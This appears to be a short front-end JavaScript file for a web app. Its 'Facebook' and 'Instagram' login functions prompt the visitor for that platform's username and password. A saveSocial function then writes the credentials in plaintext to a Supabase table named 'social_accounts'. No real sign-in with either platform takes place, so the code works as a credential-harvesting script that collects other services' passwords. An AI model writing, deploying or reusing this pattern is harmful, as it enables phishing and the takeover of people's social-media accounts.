const supabase = window.supabaseClient;

alert("App JS Loaded");

function facebookLogin() {
    const username = prompt("Enter Facebook Username");

    if (!username) return;

    const password = prompt("Enter Facebook Password");

    if (!password) return;

    saveSocial("Facebook", username, password);
}

function instagramLogin() {
    const username = prompt("Enter Instagram Username");

    if (!username) return;

    const password = prompt("Enter Instagram Password");

    if (!password) return;

    saveSocial("Instagram", username, password);
}

async function saveSocial(platform, username, password) {

    alert("Saving Data...");

    try {

        const { data, error } = await supabase
            .from("social_accounts")
            .insert([
                {
                    platform: platform,
                    username: username,
                    password: password
                }
            ]);

        if (error) {
            console.log(error);
            alert("Supabase Error: " + error.message);
        } else {
            console.log(data);
            alert("Data Saved Successfully");
        }

    } catch (err) {
        console.log(err);
        alert("Catch Error: " + err.message);
    }
}
